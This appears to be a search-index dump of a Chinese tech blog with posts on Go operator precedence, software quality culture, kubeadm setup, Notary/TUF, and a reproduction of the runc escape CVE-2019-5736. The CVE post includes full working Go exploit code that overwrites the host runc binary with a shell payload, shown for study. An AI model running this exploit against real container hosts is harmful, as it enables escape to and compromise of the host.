web3.utils.isUserEthereumAddressInBloom 15web3.utils.keccak256 web3.utils.leftPad web3.utils.numberToHex 16web3.utils.padLeft web3.utils.padRight web3.utils.randomHex 17web3.utils.rightPad web3.utils.sha3 web3.utils.sha3Raw 18web3.utils.soliditySha3 web3.utils.soliditySha3Raw web3.utils.stringToHex 19web3.utils.stripHexPrefix web3.utils.toAscii web3.utils.toBN 20web3.utils.toChecksumAddress web3.utils.toDecimal web3.utils.toHex 21web3.utils.toNumber web3.utils.toTwosComplement web3.utils.toUtf8 22web3.utils.toWei web3.utils.unitMap web3.utils.utf8ToHex 函数调用 可以用promise方式：\n1instance.getBalance().then(b =\u0026gt; { return web3.utils.fromWei(b, \u0026#39;ether\u0026#39;) }) 也可以赋值并打印。\n1let balance = receive.getBalance() 2web3.utils.fromWei(balance, \u0026#39;ether\u0026#39;) 7. 完结 基本就这样了，后续有别的操作技巧再来补充，bye~\n","link":"https://weizhang555.github.io/original/learn-solidity/","section":"original","tags":["区块链"],"title":"Solidity入门：基于Truffle搭建本地开发环境"},{"body":"","link":"https://weizhang555.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/","section":"tags","tags":null,"title":"区块链"},{"body":"","link":"https://weizhang555.github.io/categories/%E5%8E%9F%E5%88%9B/","section":"categories","tags":null,"title":"原创"},{"body":"","link":"https://weizhang555.github.io/tags/go/","section":"tags","tags":null,"title":"go"},{"body":"前言 写Go代码时一下子想不起准确的运算符优先级了，Google搜索了下，发现前面几个SEO做的比较好的网址给的要不就是错的，要不就是写的乱七八糟，误人子弟。喷的就是下面这几个出错的：\nhttps://haicoder.net/golang/golang-operator-precedence.html http://c.biancheng.net/view/5559.html http://gitbook.net/go/go_operators_precedence.html 这几个基本上是互相抄的，没有验证，很容易反驳。比如，上面说\u0026quot;+\u0026quot;, \u0026quot;-\u0026quot;的优先级大于“|”，那么以下代码\n1a := 2 | 4 - 1 的结果应该等同于\n1a := 2 | (4 - 1) 但实际上前者结果为5，后者的答案是3。原因是“-”运算符优先级与“|”实际上是相等的。\n验证链接： https://go.dev/play/p/fPFNO8r6bJ3\n简单分享下正确的运算符优先级，避免后人踩坑。\n正确的运算符优先级 Google找到了官方的说明：\nhttps://go.dev/ref/spec 可以参考其中Operator Precedence一节，介绍的非常清楚。\n单目运算符优先级最高。 单目运算符包括：\n1\u0026#34;+\u0026#34; | \u0026#34;-\u0026#34; | \u0026#34;!\u0026#34; | \u0026#34;^\u0026#34; | \u0026#34;*\u0026#34; | \u0026#34;\u0026amp;\u0026#34; | \u0026#34;\u0026lt;-\u0026#34; 双目运算符分5个优先级，从高到低为 1Precedence Operator 2 5 * / % \u0026lt;\u0026lt; \u0026gt;\u0026gt; \u0026amp; \u0026amp;^ 3 4 + - | ^ 4 3 == != \u0026lt; \u0026lt;= \u0026gt; \u0026gt;= 5 2 \u0026amp;\u0026amp; 6 1 || 分别是： “乘法类”，“加法类”，“比较类”，“逻辑与”，“逻辑或”，优先级最低的是“逻辑或”。\n","link":"https://weizhang555.github.io/original/go-operators-priority/","section":"original","tags":["go"],"title":"最准确的Go语言运算符优先级介绍"},{"body":" 我至今在两家公司工作过，第一家是华为，第二家是蚂蚁金服。在两家待的时间都足够长了，谈谈对两家公司软件质量控制的一点感悟。\n用一句话来对比两家的软件质量的话，我称为“椰子型”和“苹果型”。两家公司基本可以代表传统软件公司与互联网公司的不同的质量管理标准。\n椰子型 华为擅长做“椰子型”软件，外壳坚硬无比，内部一包水。\n华为的研发流程是很早就花大价钱从IBM引入的IPD研发流程，大致分为几个流程(参考)：\nCharter(立项) --\u0026gt; TR1/2/3 --\u0026gt; PDCP(中期) --\u0026gt; TR4/5 --\u0026gt; EDCP(结项)\n一个项目周期基本上是一年，PDCP之前是项目的设计和PoC阶段，可以改方案和设计，PDCP之后就不允许修改设计了，TR5要达到验收标准， 验收不过等同于项目延期，会对项目的Manager和团队的考评有重大影响，所以TR5的验收是极其重要且严肃的。\n整个开发模型沿用了很多年，基本上是个大的软件开发瀑布模型，周期长，与现在倡导的敏捷开发模式完全背道而驰。 这套开发模式引入之后一直在使用，使得华为一直对软件质量有着极其优秀的掌控，帮助华为站稳了ICT和企业市场，但过于笨重也遭到了很多内部人员的吐槽。 所以在云BU成立以后，也做了局部的敏捷开发的尝试。\n华为的整个研发体系和流程都是很笨重的，也很严肃。研发人员和测试人员的比例可以达到2:1左右（各个部门有不同），由于大量的测试人员的存在，对外出口的软件质量是极好的，不会出现太明显的Bug和崩溃等现象。\n所以在我看来，对外表现的是“椰子型”的外壳。\n但是我比较受不了的一点是，内部的人员质量参差不齐，差的真的是太差了。在我参加“三营”培训时，10个人一组做敏捷开发的培训，全组竟然只有我一个人能写程序，其他9个人给我做测试，也是很搞笑。更可笑的是我们组最后做出来的软件评分是第一名，可能是由于开发：测试达到了1:9吧。\n大量的低水平开发造就了垃圾一般的代码质量，所以华为的软件只能黑盒来用，要是你看到了实现的代码，怕是要战战兢兢吐一口老血了。\n“水”代码其实也不能完全怪垃圾程序员，我自己也写过很多自己不屑的垃圾代码，让我来告诉你原因。\n在最后的突击测试阶段，管理者是要看测试的漏洞数据的，要求随时间的推进测试人员发现的代码bug数应该递减，最后趋近于0，这很合理对吧？ 还有两项要求，要看bug的解决时长，这个关乎manager的考核指标，所以要求每日的bug要日清；并且TR5时系统内的bug必须清0，我不管是多么难解或者重大的bug，一定要修复。\n这两项要求给我造成了巨大的麻烦，设想一下下午6点的时候，测试给你提了5个bug，你挨个看了一下，有1个几乎不可能在短时间解决，于是你跟领导反馈，领导说必须严格按照质量标准，今天一定要解决。 这个情况就多次发生在了我的身上，于是在通宵都仍然无法解决的情况下，只能用大量的workaround去想办法从cmdline和api调用层面屏蔽掉这个bug，于是我亲手给这座代码屎山贡献了更多。最终这包屎山变成了“椰子”来到了用户手里。\n内部的整套研发流程，在我看来是有好有坏的，确实严格的管理流程给了华为对产品的严密把控。华为就是有30%的一流人才带着70%的庸才做出来世界一流软件的质量，但是对我这种有点轻微代码洁癖的人来说，是无法忍受的。 我也迫切的希望能与更多优秀的人合作，而不是浪费时间教笨人做事，所以离开华为，加入了互联网公司，希望能找到更多志同道合的人。\n苹果型 互联网公司就是完全的另一个极端了，我来介绍下蚂蚁的研发流程：\n[流程加载失败...]\n你没看错，没有研发流程，质量把控流程完全没有，测试工程师也很少。 据我所知，这种模式在互联网公司比较流行，即使是Google，Facebook这种大厂也是如此，Facebook是全栈工程师，每个人开发的组件直接上线运行和实测，所以听闻Google的工程师经常嘲讽Facebook是“踩着香蕉皮滑行”，滑到哪儿算哪儿。\n这种模式之所以并没有引起大的问题，在我看来主要是两点原因：\n1.人员平均水平较高\n每个人的主观能动性比较高，代码平均质量较高，会主动写单元测试和集成测试，习惯于敏捷开发，CI/CD。靠着优秀程序员的自我修养，代码质量仍然获得了一定的保证。\n2.面向消费者业务较多，bug不敏感\nToC的业务对产品的质量要求并没有企业级或CT级要求高，Web形态的产品完全可以先推一个公测版的产品出去试试效果，对于Bug的存在是有一定容忍度的。本身互联网产品迭代快，对速度的要求胜过对质量的要求。\n所以好的互联网公司的产品质量通常是“苹果型”的，外表摸起来有一点点硬，打开来看，内部代码质量也不错。 由于测试人员缺失以及快速迭代的需求，很难将外表做的像椰子一样。\n互联网的开发流程较敏捷，留给工程师的自由发挥空间比较大，所以从我个人来说，是更喜欢互联网这种模式的。二八效应决定着一套80分的软件做到100分需要额外耗费巨大的人力，在不成正比的投入产出面前，有必要衡量下是否要继续优化下去？\n没有流程其实造成了更大的问题，项目立项随意，周期随意，没有验收标准，为了KPI每个人都在努力的造轮子却不管重复不重复。所以我看到的是，对外我们是有无数的黑科技呈现出来，从外部看我们的软件研发能力是无比强大的，但是很多黑科技只能偏居一隅没有机会获得大规模推广，大规模推广的项目也有很多致命的缺陷导致寿命不长。\n由此，阿里巴巴已经开始沦落为“geek的自留地”，自己内部玩的嗨，更多的却是“内卷”而不是创造实际价值。\n选哪个？ 二八效应对应着中国的一句成语“行百里者半九十”，所以在继续提升产品质量的时候，我们都要掂量一下是否值得如此大的投入？\n不同的企业会有不同的选择，ToB or ToC的选择会有大的不同。在我还在华为的时候，我痛恨70%的庸才拉低了华为的档次，拉低了我对外的credit，但是华为的80分到90分恰恰需要70%的庸才作为一颗颗螺丝钉消耗自身的精力来完成，而Google，Facebook的优秀人才们只愿意做软件开发的前一部分创造性的工作做到85分，而非整天无休止的消耗自己。由此造就了“椰子型”与“苹果型”软件的不同。\n选哪个？从政治正确的角度考虑，我们要做“石头型”的软件，从公司层面，“椰子型”是不错的选择，从工程师个人角度，还是“苹果型”更加友好。\n我现在要承认，自己还是很怀念IPD研发流程的，它可恨却又很有用，帮助产品找到正确的方向以及一直运行在正确的轨道上。蚂蚁相比华为，还是有小作坊vs大厂的既视感的，但是我无意贬低任意一家，对前东家和现东家我内心都是喜欢的。\nRespect to everything!\n","link":"https://weizhang555.github.io/original/different-software-types/","section":"original","tags":null,"title":"你的软件是“椰子”还是“苹果”？"},{"body":"CVE-2019-5736是一个比较知名的runc漏洞，利用方式简单，危害很大，经常被拿来做云原生安全的攻击/防御演示。\n我最近也研究了下这个漏洞的使用，研究的第一步首先是复现。\n尝试了github上的示例： https://github.com/Frichetten/CVE-2019-5736-PoC ， 这里对源码做了一些修改，在下面分享一下。\n注意：ubuntu上安装的docker 18.06似乎已经打上了补丁，我手动编译了runc的1.0.0-rc5版本才成功复现。\n复现方式：\n在一个terminal里面：\n1zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v $PWD/exploit:/exploit ubuntu:18.04 bash 另一个terminal内执行：\n1$ docker exec -ti 5b28d7ab5083 /bin/sh 此时第一个terminal的打印：\n1zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v $PWD/exploit:/exploit ubuntu:18.04 bash 2root@5b28d7ab5083:/# /exploit 3[+] Overwritten /bin/sh successfully 4[+] Found the PID: 17 5[+] Successfully got the file handle 6[-]Failed to open /proc/self/fd/3: open /proc/self/fd/3: text file busy 7[+] Successfully got write handle \u0026amp;{0xc0000501e0} 8root@5b28d7ab5083:/# /tmp/下多了一个passwd文件。\nUbuntu下面没有原demo里使用的/etc/shadow文件，所以我修改成了/etc/passwd，会被copy到/tmp/目录下。\n修改过的源码：\n1package main 2 3// Implementation of CVE-2019-5736 4// Created with help from @singe, @_cablethief, and @feexd. 5// This commit also helped a ton to understand the vuln 6// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d 7import ( 8\t\u0026#34;fmt\u0026#34; 9\t\u0026#34;io/ioutil\u0026#34; 10\t\u0026#34;os\u0026#34; 11\t\u0026#34;strconv\u0026#34; 12\t\u0026#34;strings\u0026#34; 13\t\u0026#34;time\u0026#34; 14) 15 16// This is the line of shell commands that will execute on the host 17var payload = \u0026#34;#!/bin/bash \\n cat /etc/passwd \u0026gt; /tmp/passwd \u0026amp;\u0026amp; chmod 777 /tmp/shadow\u0026#34; 18 19func main() { 20\t// First we overwrite /bin/sh with the /proc/self/exe interpreter path 21\tfd, err := os.Create(\u0026#34;/bin/sh\u0026#34;) 22\tif err != nil { 23\tfmt.Println(err) 24\treturn 25\t} 26\tfmt.Fprintln(fd, \u0026#34;#!/proc/self/exe\u0026#34;) 27\terr = fd.Close() 28\tif err != nil { 29\tfmt.Println(err) 30\treturn 31\t} 32\tfmt.Println(\u0026#34;[+] Overwritten /bin/sh successfully\u0026#34;) 33 34\t// Loop through all processes to find one whose cmdline includes runcinit 35\t// This will be the process created by runc 36\tvar found int 37\tfor found == 0 { 38\tpids, err := ioutil.ReadDir(\u0026#34;/proc\u0026#34;) 39\tif err != nil { 40\tfmt.Println(err) 41\treturn 42\t} 43\tfor _, f := range pids { 44\tfbytes, _ := ioutil.ReadFile(\u0026#34;/proc/\u0026#34; + f.Name() + \u0026#34;/cmdline\u0026#34;) 45\tfstring := string(fbytes) 46\tif strings.Contains(fstring, \u0026#34;runc\u0026#34;) { 47\tfmt.Println(\u0026#34;[+] Found the PID:\u0026#34;, f.Name()) 48\tfound, err = strconv.Atoi(f.Name()) 49\tif err != nil { 50\tfmt.Println(err) 51\treturn 52\t} 53\t} 54\t} 55\t} 56 57\t// We will use the pid to get a file handle for runc on the host. 58\tvar handleFd = -1 59\tfor handleFd == -1 { 60\t// Note, you do not need to use the O_PATH flag for the exploit to work. 61\thandle, _ := os.OpenFile(\u0026#34;/proc/\u0026#34;+strconv.Itoa(found)+\u0026#34;/exe\u0026#34;, os.O_RDONLY, 0777) 62\tif int(handle.Fd()) \u0026gt; 0 { 63\thandleFd = int(handle.Fd()) 64\t} 65\t} 66\tfmt.Println(\u0026#34;[+] Successfully got the file handle\u0026#34;) 67 68\t// Now that we have the file handle, lets write to the runc binary and overwrite it 69\t// It will maintain it\u0026#39;s executable flag 70\tfor { 71\twriteHandle, err := os.OpenFile(\u0026#34;/proc/self/fd/\u0026#34;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) 72\tif err != nil { 73\tfmt.Printf(\u0026#34;[-]Failed to open /proc/self/fd/%d: %v\\n\u0026#34;, handleFd, err) 74\ttime.Sleep(1 * time.Second) 75\tcontinue 76\t} 77\tif int(writeHandle.Fd()) \u0026gt; 0 { 78\tfmt.Println(\u0026#34;[+] Successfully got write handle\u0026#34;, writeHandle) 79\twriteHandle.Write([]byte(payload)) 80\treturn 81\t} 82\t} 83} ","link":"https://weizhang555.github.io/original/runc-host-escape-cve/","section":"original","tags":["容器","安全","runc"],"title":"docker-runc主机逃逸漏洞复现：CVE-2019-5736"},{"body":"","link":"https://weizhang555.github.io/tags/runc/","section":"tags","tags":null,"title":"runc"},{"body":"","link":"https://weizhang555.github.io/tags/%E5%AE%89%E5%85%A8/","section":"tags","tags":null,"title":"安全"},{"body":"","link":"https://weizhang555.github.io/tags/%E5%AE%B9%E5%99%A8/","section":"tags","tags":null,"title":"容器"},{"body":"","link":"https://weizhang555.github.io/tags/k8s/","section":"tags","tags":null,"title":"K8s"},{"body":"本文介绍如何使用kubeadm安装一个简单的包含三个节点的集群。\n测试环境 三台VM，分别为test-vm, test-vm-1, test-vm-2，系统是ubuntu 19.04\n下载 kubernetes的安装包，官方文档用apt get的方式，由于国内被墙了没法get到，可以直接从github上下载release包。把kubeadm，kubelet, kubectl装好就够了。docker当然也要装好。\n具体的安装步骤暂时略过。\n配置kubelet 三台节点可以手动配置一下kubelet服务，配置方法都是一样的：\n1# cat \u0026gt; /lib/systemd/system/kubelet.service \u0026lt;\u0026lt; EOF 2[Unit] 3Description=kubelet: The Kubernetes Node Agent 4Documentation=http://kubernetes.io/docs/ 5 6[Service] 7ExecStart=/usr/bin/kubelet 8Restart=always 9StartLimitInterval=0 10RestartSec=10 11 12[Install] 13WantedBy=multi-user.target 14EOF 上面就是简单的调用了下kubelet命令，实际上还有很多参数，这个不着急。因为我们是用kubeadm配置的，所以实际上生效的是kubeadm为kubelet设置的参数，kubelet的启动将依赖kubeadm设置的bootstrap配置：\n1# mkdir -p /etc/systemd/system/kubelet.service.d/ 2# cat \u0026gt; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf \u0026lt;\u0026lt; EOF 3[Service] 4Environment=\u0026#34;KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf\u0026#34; 5Environment=\u0026#34;KUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yaml\u0026#34; 6# This is a file that \u0026#34;kubeadm init\u0026#34; and \u0026#34;kubeadm join\u0026#34; generates at runtime, populating the KUBELET_KUBEADM_ARGS variable dynamically 7EnvironmentFile=-/var/lib/kubelet/kubeadm-flags.env 8# This is a file that the user can use for overrides of the kubelet args as a last resort. Preferably, 9# the user should use the .NodeRegistration.KubeletExtraArgs object in the configuration files instead. 10# KUBELET_EXTRA_ARGS should be sourced from this file. 11EnvironmentFile=-/etc/default/kubelet 12ExecStart= 13ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS 14EOF 设置开机启动\n1# systemctl daemon-reload 2# systemctl enable kubelet 3# systemctl start kubelet 4# swapoff -a //K8s要求关闭swap docker我这里默认都配置好了，就不详细讲解了。\n拉起master节点 这里我们用test-vm作为master节点。\n主要参考这个： https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/\n这里我先想好要用什么网络方案，自己尝试了下calico，总感觉有点问题。保守点先选择Flannel好了。\n引用一段：\nFor flannel to work correctly, you must pass --pod-network-cidr=10.244.0.0/16 to kubeadm init.\nmaster节点拉起K8s control plane：\n1# kubeadm init --pod-network-cidr=10.244.0.0/16 --image-repository=docker.io/mirrorgooglecontainers --kubernetes-version=1.13.4 --ignore-preflight-errors=SystemVerification 镜像仓库选用了docker.io/mirrorgooglecontainers 是因为默认是从k8s.io这个镜像仓库拉K8s控制组件的，这个在CN是被和谐的；K8s版本这里我永乐1.13.4，init过程把SystemVerification禁用了，是因为我的内核版本太高了（5.0.0-16），检查报错。\n运行中你可能会发现报错docker.io/mirrorgooglecontainers/coredns 镜像拉取不下来，那是因为我把所有仓库都默认换到coredns里，mirrorgooglecontainer里面并不包含coredns。手动拉取一个coredns镜像并且tag为docker.io/mirrorgooglecontainers/coredns 就可以了（tag省略了）。\n现在开始烧香拜佛，不顺利的话会看到报错or看不到报错，慢慢debug吧；一切顺利的话可以看到成功消息：\n1Your Kubernetes master has initialized successfully! 2 3To start using your cluster, you need to run the following as a regular user: 4 5 mkdir -p $HOME/.kube 6 sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config 7 sudo chown $(id -u):$(id -g) $HOME/.kube/config 8 9You should now deploy a pod network to the cluster. 10Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: 11 https://kubernetes.io/docs/concepts/cluster-administration/addons/ 12 13You can now join any number of machines by running the following on each node 14as root: 15 16 kubeadm join 192.168.122.2:6443 --token 8e8iei.lh8gumyd8ap7kgtz --discovery-token-ca-cert-hash sha256:84f7d6aeec39dc6efe60db6c82f8d97dc220c96e6455a1710c17daa060ef9300 自己按照上面信息指引把$HOME/.kube/config搞好，就可以用普通用户操作k8s集群了。下面的kubeadm留好，后面要在worker上用。\n查看下状态：\n1# kubectl get node 2NAME STATUS ROLES AGE VERSION 3test-vm NotReady master 5m4s v1.13.4 4 5# kubectl get componentstatus 6NAME STATUS MESSAGE ERROR 7controller-manager Healthy ok 8scheduler Healthy ok 9etcd-0 Healthy {\u0026#34;health\u0026#34;: \u0026#34;true\u0026#34;} 10 11# kubectl -n kube-system get pod 12NAME READY STATUS RESTARTS AGE 13coredns-9f7ddc475-8jl54 0/1 Pending 0 6m3s 14coredns-9f7ddc475-g79j2 0/1 Pending 0 6m3s 15etcd-test-vm 1/1 Running 0 5m10s 16kube-apiserver-test-vm 1/1 Running 0 5m28s 17kube-controller-manager-test-vm 1/1 Running 0 5m7s 18kube-proxy-vqqf4 1/1 Running 0 6m3s 19kube-scheduler-test-vm 1/1 Running 0 5m12s 可以看到K8s的控制面正常，但是coredns pending了，这个是因为网络还没配置。\n先别动worker节点，我们先把网络配好。\n上面我们说用Flannel：\n1# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/62e44c867a2846fefb68bd5f178daf4da3095ccb/Documentation/kube-flannel.yml 如果kubectl -n kube-system get pod 显示coredns变成running了，那就说明一切顺利，都成功了。\n不过我就遇到了一个小问题，coredns一直不变成running，利用命令kubectl -n kube-system describe pod coredns-9f7ddc475-8jl54查看错误发现，/opt/cni/bin/bridge找不到导致无法teardown pod，我找到了个bridge的cni插件放过去就解决了。\n增加worker 在worker节点test-vm-1，test-vm-2上执行同样步骤：\n1# kubeadm join 192.168.122.2:6443 --token 8e8iei.lh8gumyd8ap7kgtz --discovery-token-ca-cert-hash sha256:84f7d6aeec39dc6efe60db6c82f8d97dc220c96e6455a1710c17daa060ef9300 --ignore-preflight-errors=SystemVerification 第二个worker也如法炮制。\n顺利的话可以在master节点上看到三个node了。\n1# kubectl get node 2NAME STATUS ROLES AGE VERSION 3test-vm Ready master 28m v1.13.4 4test-vm-1 Ready \u0026lt;none\u0026gt; 51s v1.13.4 5test-vm-2 Ready \u0026lt;none\u0026gt; 61s v1.13.4 ","link":"https://weizhang555.github.io/original/kubernetes-setup/","section":"original","tags":["容器","K8s"],"title":"kubernetes安装指南"},{"body":"\n1. TUF 1.1 背景 TUF是Tor项目设计出的一套安全分发软件更新的框架，Notary是TUF框架的go语言实现，而Docker Content Trust是TUF框架的应用。理清三者关系有助于后续理解。\n1.2 TUF的角色 TUF框架包含五类角色，对应五把密钥，分别是Root, Target, Snapshot, Timestamp, Delegated target(可选)，每个角色对应一个元数据文件及一把密钥。\nTUF角色和密钥的理解与Notary介绍有重合，可以参考 \u0026quot;2.3 Notary的密钥管理\u0026quot;\n1.2 TUF的工作流 TUF框架的定义在这里：https://github.com/theupdateframework/specification/blob/master/tuf-spec.md 。\nstep 0: 加载可信的root元数据文件 这一步可以认为是前奏步骤。一个初始的root元数据文件应该早已经随包管理器交付到客户端，或者通过带外流程放置进去了。此时的root元数据文件的超时不重要，因为下一步会更新它。\nstep 1: 更新root元数据文件 由于现在元数据文件可能是被完全不同的一组key签名的，客户端必须有办法能持续的更新到最新的密钥，通过不断的下载中间阶段的密钥一直到最新版。\nstep 1.1: 使用N代表可信root元数据文件的版本号 step 1.2: 下载root元数据文件的N+1版本 文件名是固定的格式：VERSION_NUMBER.FILENAME.EXT (e.g., 42.root.json)。不成功的话跳转到1.8步。\nstep 1.3: 检查签名 N+1版的root元数据必须被以下密钥签名：1）N版本root元数据内指定的达到阈值数量的密钥。2）新版本的root元数据里指定的达到阈值数量的密钥。\n如果N+1版本的root元数据没有被正确签名，退出并报错。\nstep 1.4: 检查回滚攻击(rollback attach) 当前信任的root元数据文件版本（N）必须小于新的root元数据文件（N+1）。如果不是退出并报错。\nstep 1.5: 新版本元数据文件的超时时间可以忽略，1.8会检查 step 1.6: 设置受信任的root元数据文件为新的元数据文件 step 1.7: 重复step 1.1到1.7直到root元数据为最新 step 1.8: 检查冻结攻击(freeze attach) 检查当前的信任的root元数据文件是否过期，过期的报错退出。\nstep 1.9: 如果timestamp和/或snapshot密钥已经改变，删掉snapshot和timestamp元数据文件 这个是为了从快进攻击(fast-forward attach)中恢复出来。快进攻击是攻击者可以任意增加元数据的版本号：1）timestamp元数据。2）snapshot元数据。3）targets元数据。\nstep 2: 下载timestamp元数据文件 下载固定文件名timestamp.json\nstep 2.1：检查签名 使用可信的root元数据文件里包含的timestamp公钥验证签名。\nstep 2.2：检查回滚攻击 step 2.3：检查冻结攻击 step 3：下载snapshot元数据文件 如果使能了一致性snapshot，那么文件名就是VERSION_NUMBER.FILENAME.EXT (e.g., 42.snapshot.json)格式，否则就是固定的snapshot.json。\nstep 3.1：对照timestamp元数据检查 新的snapshot元数据文件的hash和版本号必须和timestamp元数据文件里的一致。否则报错并退出。\nstep 3.2：检查签名 snapshot元数据文件应该被root元数据文件里面指定的snapshot key正确签名。否则报错退出。\nstep 3.3：检查回滚攻击 step 3.4：检查冻结攻击 step 4：下载最顶层的targets元数据 下载targets.json\nstep 4.1：对照snapshot元数据检查 新的targets元数据文件的hash和版本号必须与可信的snapshot元数据文件内保存的一致。\nstep 4.2：检查“任意软件攻击”（arbitrary software attack） 新的targets元数据文件必须被root元数据文件里指定的targets密钥正确签名，否则报错退出。\nstep 4.3：检查回滚攻击 step 4.4：检查冻结攻击 step 4.5：前序遍历搜索对应的target，以最顶层的target角色为起始 Note: 前序遍历：按根节点-左子树-右子树的顺序遍历。实际上指的是targets及相应delegation角色构成的数\nstep 4.5.1 如果节点已经被访问过了，那么跳过这个节点以避免访问环路。如果角色包含了所需要的target元数据，那么跳到step 5。 step 4.5.2 递归访问delegation列表，直到找到相应的targets元数据。 step 5：对照target元数据验证target step 5.1：找到对应的target元数据，报错退出 step 5.2：否则下载相应的target，验证hash是否与target元数据里的匹配。 2. Notary 2.1 介绍 Notary一个client和一个server组件。\n它意图为用户创建一个易用的内容分发和验证系统，TLS本身可以用于加密同web server的安全通道，但是当server沦陷的时候，恶意用户可以轻易的将合法内容替换成非法内容。\n使用notary，用户可以用自己妥善保管的线下密钥签名他们的内容，然后发布它的签民的可信内容到他的notary server。\n内容的使用者，通常事先获取了内容发布者的公钥，可以与Notary server通信来验证内容的合法性和完整性。\n2.2 目标 Notary的实现基于TUF(The Update Framework)，TUF是软件安全发布与升级的通用设计。借助TUF，Notary可以获得一些关键优势：\n抗密钥泄漏。内容发布者必须使用密钥来签名内容，镜像签名系统必须保证密钥泄露之后系统可以恢复。TUF使用分层次的多把密钥，可以保证密钥泄漏不会影响。 新鲜性保证。重放攻击是常见的攻击手段，攻击者可以将老的拥有合法签名的软件包伪装成最新的软件包发布给客户，这些旧软件包可能包含漏洞。Notary使用时间戳来保证内容使用者收到的是最新的内容。 可配置的信任阈值。经常有一种情形是允许多个发布者发布同一份内容，比如某个项目的多个maintainers。使用信任阈值可以保证只有一定数量的发布者同时签名一份文件他才可以被信任，这样可以保证单独的一份密钥泄漏不会允许恶意内容被发布出去。（Q: 听上去很好，怎么用？一把用户key，一把ci key？） 签名授权。内容发布者可以将自己的部分可信内容集合授权给另一个签名者。 使用现有的发布渠道。Notary不需要和任何特殊的发布通道绑定。 不信任的Mirrors和传输。Notary的元数据可以通过任意的镜像或者通道传输。 2.3 Notary的密钥管理 TUF的密钥是分角色的，不同的密钥有不同的特性和功能。\nRoot key: 用来签名root元数据，root元数据存储了root，targets，snapshot和timestamp公钥的ID。客户可以用这些公钥来验证所有的元数据文件的签名。root key极其重要，建议离线存放，比如存在yubi key硬件里面。它的过期时间应该也是最长的，比如10年。 Snapshot key：用来签名snapshot元数据，snapshot元数据列举了集合[注1]的root，targets和delegation元数据文件的文件名大小和hash，它用于验证其他元数据文件的完整性。可以给集合的拥有者保存，也可以给notary service保存。 timestamp key: 签名timestamp元数据，timestamp元数据通过给元数据指定最小超时时间，以及指定最新的snapshot的文件名大小hash值等来保证时效性。它用来验证snapshot文件的完整性。timestamp密钥由notary service保存，它可以自动重新生成而不需要集合的拥有者参与。有效期应该最短，比如14天。 target key：签名target元数据，target元数据列举了集合内的文件名，大小及相应的hash，这个文件用来验证repository的实际内容的完整性。也用来给其他的合作者授权。这个key由拥有者持有。有效期中等，比如3年。 Delegation key：用于签名delegation元数据，delegation元数据列举了集合文件名，大小及hash。这个key与target key实际上是相似的，也可以授权给下一级合作者。 注：\n[1] .集合：docker content trust里面实际上是image名字，集合是tag的集合，\n加一张图方便理解：\n3. Docker Content Trust本地测试 3.1 环境准备 启动本地registry 1$ docker run -d -p 5000:5000 registry:2.4.1 启动notary 1$ cd notary-src-dir 2$ docker-compose up -d 导出环境变量 1$ export REGISTRY=localhost:5000 2$ export DOCKER_CONTENT_TRUST=1 3$ export DOCKER_CONTENT_TRUST_SERVER=https://localhost:4443 3.2 push的镜像无签名的情况 先pull一个测试用的镜像：\n1$ docker pull ubuntu:18.04 2$ docker images ubuntu:18.04 3REPOSITORY TAG IMAGE ID CREATED SIZE 4ubuntu 18.04 7698f282e524 12 days ago 69.9MB 5$ docker tag ubuntu:18.04 $REGISTRY/test/ubuntu:18.04 先把不使用notary签名的版本搞上去。\n1$ export DOCKER_CONTENT_TRUST=0 2$ docker push $REGISTRY/test/ubuntu:18.04 本地删除镜像，然后分别用支持Notary和不支持notary的方式pull一下试试：\n1$ docker rmi -f 7698f282e524 2$ export DOCKER_CONTENT_TRUST=1 3$ docker pull $REGISTRY/test/ubuntu:18.04 4Error: remote trust data does not exist for localhost:5000/test/ubuntu: localhost:4443 does not have trust data for localhost:5000/test/ubuntu 5$ export DOCKER_CONTENT_TRUST=0 6$ docker pull $REGISTRY/test/ubuntu:18.04 718.04: Pulling from test/ubuntu 86abc03819f3e: Pull complete 905731e63f211: Pull complete 100bd67c50d6be: Pull complete 11Digest: sha256:b36667c98cf8f68d4b7f1fb8e01f742c2ed26b5f0c965a788e98dfe589a4b3e4 12Status: Downloaded newer image for localhost:5000/test/ubuntu:18.04 可以看到如果用户上次的image没有被notary签名过，那么当客户端指定enable了content trust之后，是无法pull不可信的image的。\n3.3 push有签名的版本 1$ export DOCKER_CONTENT_TRUST=1 2$ docker push $REGISTRY/test/ubuntu:18.04 3The push refers to repository [localhost:5000/test/ubuntu] 48d267010480f: Layer already exists 5270f934787ed: Layer already exists 602571d034293: Layer already exists 718.04: digest: sha256:b36667c98cf8f68d4b7f1fb8e01f742c2ed26b5f0c965a788e98dfe589a4b3e4 size: 943 8Signing and pushing trust metadata 9You are about to create a new root signing key passphrase. This passphrase 10will be used to protect the most sensitive key in your signing system. Please 11choose a long, complex passphrase and be careful to keep the password and the 12key file itself secure and backed up. It is highly recommended that you use a 13password manager to generate the passphrase and keep it safe. There will be no 14way to recover this key. You can find the key in your config directory. 15Enter passphrase for new root key with ID 74088e3: 16Repeat passphrase for new root key with ID 74088e3: 17Enter passphrase for new repository key with ID 5e28dca: 18Repeat passphrase for new repository key with ID 5e28dca: 19Finished initializing \u0026#34;localhost:5000/test/ubuntu\u0026#34; 20Successfully signed localhost:5000/test/ubuntu:18.04 可以看到push成功了之后会在给notary做一次签名。\n此时客户端可以成功pull，不论CONTENT_TRUST是否enble，签名检查对用户是透明的。\n使用以下命令可以撤销对image的签名：\n1$ docker trust revoke $REGISTRY/test/ubuntu:18.04 3.4 